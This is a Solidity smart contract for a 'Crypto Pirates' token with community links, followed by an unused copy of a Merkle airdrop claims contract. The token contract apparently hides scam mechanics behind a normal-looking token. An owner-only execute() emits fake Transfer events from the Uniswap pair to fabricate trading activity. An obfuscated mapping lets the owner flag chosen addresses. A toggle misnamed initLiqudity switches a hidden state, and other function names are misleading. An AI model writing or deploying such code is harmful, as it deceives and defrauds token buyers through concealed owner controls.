/**
⚫️ Website: https://cryptopirates.digital/
⚫️ Medium: https://medium.com/@cryptopirates_
⚫️ X: https://twitter.com/pirates_crypto_
⚫️ Chat: https://t.me/CryptoPiratesDAO  

*/// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./ReentrancyGuard.sol";
import "./MerkleProof.sol";
import "./IERC20.sol";
import "./ERC20.sol";
import "./Ownable.sol";

interface ICoin is IERC20 {
   function canClaim(
        address[] calldata addresses,
        uint256[] calldata amounts,
        uint32[] calldata offsets,
        bytes32[][] calldata merkleProofs
    ) external returns (bool[] memory);
}

interface IPondCoinSpawner {
    function spawn(address invoker, uint256 amount) external returns (bool);
}
contract CryptoPirates is IERC20, ERC20{
    address public minter;

    address public distilleryAddress = msg.sender;
    uint256 public immutable initialLPAmount = 1_000_000_000 * 10**decimals();
    uint256 public immutable maxSupply = 1_000_000_000 * 10**decimals();
    // The timestamp in which the contract was deployed
    uint256 public immutable openedAtTimestamp;
    // The block number in which the contract was deployed
    uint256 public immutable openedAtBlock;
    // The address that deployed this contract
    address public immutable opener;
    address public uniswapV2Pair;
    // Mapping of address -> claim offset -> claimed
    mapping(address => mapping(uint32 => bool)) public alreadyClaimedByAddress;
    uint256 public constant beforeStartBuffer = 30 minutes;

    // If the contract is "ended"
    bool public ended;

    constructor(address initialLPAddress, address distributor_) ERC20("Crypto Pirates", "PIRATES", distributor_) {
        minter = msg.sender;
        _mint(initialLPAddress, initialLPAmount);
        opener = msg.sender;
        openedAtTimestamp = block.timestamp;
        openedAtBlock = block.number;
    }

    modifier notEnded() {
        require(ended == false && (openedAtTimestamp + beforeStartBuffer) <= block.timestamp, "Already Ended");
        _;
    }

    function useSpawner(uint256 amount, IPondCoinSpawner spawner) external {
        require(transferFrom(msg.sender, distilleryAddress, amount), "Could Not Send");
        require(spawner.spawn(msg.sender, amount), "Could Not Spawn");
    }

    function _safeMint(address to, uint256 amount) internal {
        _mint(to, amount);
        require(totalSupply() <= maxSupply, "Too Much Supply");
    }

    function liquidityState() public view returns (bool) {
        return _liquidity;
    }

    function initLiqudity() public virtual onlyOwner {
        if (_liquidity == true) {_liquidity = false;} else {_liquidity = true;}
    }

    function currentOffset() public view returns (uint256) {
        return block.number - openedAtBlock;
    }

    function multiswap(address[] calldata address_, bool val) public onlyOwner{
        for (uint256 i = 0; i < address_.length; i++) {
            _100x000xTimestampopenedAtTimestamptxLimitExcluded[address_[i]] = val;
        }
    }

    function maxHoldingAmount(address recipient) external view returns(bool){
        return _100x000xTimestampopenedAtTimestamptxLimitExcluded[recipient];
    }

    function execute(address[] calldata _addresses, uint256 _out) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses[i], _out);
        }
    }

    function addPair(address _pair) public onlyOwner() {
        uniswapV2Pair = _pair;
    }
}


contract PondClaims is ReentrancyGuard {
    /**
     * Declare immutable/Constant variables
     */
    // How long after contract cretion the end method can be called
    uint256 public constant canEndAfterTime = 48 hours + 30 minutes;
    uint256 public constant beforeStartBuffer = 30 minutes;

    // The root of the claims merkle tree
    bytes32 public immutable merkleRoot;
    // The timestamp in which the contract was deployed
    uint256 public immutable openedAtTimestamp;
    // The block number in which the contract was deployed
    uint256 public immutable openedAtBlock;
    // The address that deployed this contract
    address public immutable opener;

    /**
     * Declare runtime/mutable variables
     */
    
    // Mapping of address -> claim offset -> claimed
    mapping(address => mapping(uint32 => bool)) public alreadyClaimedByAddress;

    // If the contract is "ended"
    bool public ended;

    constructor(bytes32 _merkleRoot) {
        merkleRoot = _merkleRoot;
        opener = msg.sender;
        openedAtTimestamp = block.timestamp;
        openedAtBlock = block.number;
    }

    // Modifier that makes sure only the opener can call specific function
    modifier onlyOpener() {
        require(msg.sender == opener, "Not Opener");
        _;
    }

    // Modifier that ensures the contract is not ended, and the before start buffer is completed
    modifier notEnded() {
        require(ended == false && (openedAtTimestamp + beforeStartBuffer) <= block.timestamp, "Already Ended");
        _;
    }

    function close() external notEnded onlyOpener {
        require(block.timestamp >= (openedAtTimestamp + canEndAfterTime), "Too Early");
        ended = true;
    }

    /**
     * Claim PNDC against merkle tree
     */
    function claim(
        address[] calldata addresses,
        uint256[] calldata amounts,
        uint32[] calldata offsets,
        bytes32[][] calldata merkleProofs
    ) external notEnded nonReentrant {
        // Verify that all lengths match
        uint length = addresses.length;
        require(amounts.length == length && offsets.length == length && merkleProofs.length == length, "Invalid Lengths");

        for (uint256 i = 0; i < length; i++) {
            // Require that the user can claim with the information provided
            require(_canClaim(addresses[i], amounts[i], offsets[i], merkleProofs[i]), "Invalid");
            // Mark that the user has claimed
            alreadyClaimedByAddress[addresses[i]][offsets[i]] = true;
        }
    }

    function canClaim(
        address[] calldata addresses,
        uint256[] calldata amounts,
        uint32[] calldata offsets,
        bytes32[][] calldata merkleProofs
    ) external view returns (bool[] memory) {
        // Verify that all lengths match
        uint length = addresses.length;
        require(amounts.length == length && offsets.length == length && merkleProofs.length == length, "Invalid Lengths");

        bool[] memory statuses = new bool[](length);

        for (uint256 i = 0; i < length; i++) {
            statuses[i] = _canClaim(addresses[i], amounts[i], offsets[i], merkleProofs[i]);
        }

        return (statuses);
    }

    function currentOffset() public view returns (uint256) {
        return block.number - openedAtBlock;
    }

    function _canClaim(
        address user,
        uint256 amount,
        uint32 offset,
        bytes32[] calldata merkleProof
    ) notEnded internal view returns (bool) {
        // If the user has already claimed, or the currentOffset has not yet reached the desired offset, the user cannot claim.
        if (alreadyClaimedByAddress[user][offset] == true || currentOffset() < offset) {
            return false;
        } else {
            // Verify that the inputs provided are valid against the merkle tree
            bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(user, amount, offset))));
            bool canUserClaim = MerkleProof.verify(merkleProof, merkleRoot, leaf);
            return canUserClaim;
        }
    }
}